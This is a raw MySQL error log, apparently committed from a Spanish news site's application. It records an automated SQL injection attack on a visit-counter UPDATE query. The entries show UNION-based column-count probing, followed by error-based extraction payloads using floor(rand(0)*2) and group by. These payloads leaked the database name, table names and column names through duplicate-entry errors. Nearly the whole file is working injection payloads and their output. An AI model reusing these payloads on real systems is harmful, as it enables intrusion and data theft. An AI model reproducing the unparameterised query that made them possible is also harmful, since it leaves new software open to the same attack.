+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6F70696E696F6E limit 7,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:39:13
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'visitas'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6F70696E696F6E limit 6,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:39:11
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'imagenautor'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6F70696E696F6E limit 5,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:39:06
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'autor'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6F70696E696F6E limit 4,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:39:03
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'cuerpo'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6F70696E696F6E limit 3,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:39:00
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'titulo'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6F70696E696F6E limit 2,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:57
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'date'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6F70696E696F6E limit 1,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:54
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'id'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6F70696E696F6E limit 0,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:51
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'9'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,count(column_name),0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6F70696E696F6E)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:48
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'videotype'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 18,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:44
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'visitas'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 17,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'video'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 16,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:38
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'parrafo5'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 15,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'imagen5'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 14,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'parrafo4'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 13,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'imagen4'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 12,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'parrafo3'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 11,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:23
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'imagen3'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 10,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:20
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'parrafo2'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 9,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:17
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'imagen2'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 8,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:13
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'parrafo'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 7,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:10
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'imagen'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 6,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:07
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'titulo'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 5,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:05
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'ubicacion'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 4,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:38:02
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'ciudad'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 3,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:37:59
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'clasificacion'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 2,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:37:56
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'date'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 1,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:37:53
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'id'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173 limit 0,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:37:49
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'19'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,count(column_name),0x27,0x7e) from `information_schema`.columns where table_schema=0x64656C6264 and table_name=0x6E6F746963696173)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:37:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'opinion'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,table_name,0x27,0x7e) from `information_schema`.tables where table_schema=0x64656C6264 limit 1,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:37:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'noticias'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,table_name,0x27,0x7e) from `information_schema`.tables where table_schema=0x64656C6264 limit 0,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:37:27
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,unhex(Hex(cast(table_name as char))),0x27,0x7e) from `information_schema`.tables where table_schema=0x64656C6264 limit 0,1)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:37:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'2'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,count(table_name),0x27,0x7e) from `information_schema`.tables where table_schema=0x64656C6264)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:37:22
+SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,unhex(Hex(cast(group_concat(table_name) as char))),0x27,0x7e) from `information_schema`.tables where table_schema=0x64656C6264)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:37:19
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'2'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,count(table_name),0x27,0x7e) from `information_schema`.tables where table_schema=0x64656C6264)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:36:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '~'delbd'~1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,unhex(Hex(cast(database() as char))),0x27,0x7e)) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1
+
+Time : 05:36:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:36:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:36:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:36:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:36:18
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:36:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:36:15
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:36:13
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:36:12
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:36:10
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:36:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:36:06
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:36:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:36:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:36:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:36:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:35:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:35:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:35:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:35:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null,nul' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:35:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:35:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:35:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null,null--
+
+Time : 05:35:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null,null--
+
+Time : 05:35:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null,null--
+
+Time : 05:35:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null,null--
+
+Time : 05:35:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null,null--
+
+Time : 05:35:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null,null--
+
+Time : 05:35:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null,null--
+
+Time : 05:35:44
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null,null--
+
+Time : 05:35:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null,null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null,null--
+
+Time : 05:35:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union all select null--' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7275 union all select null--
+
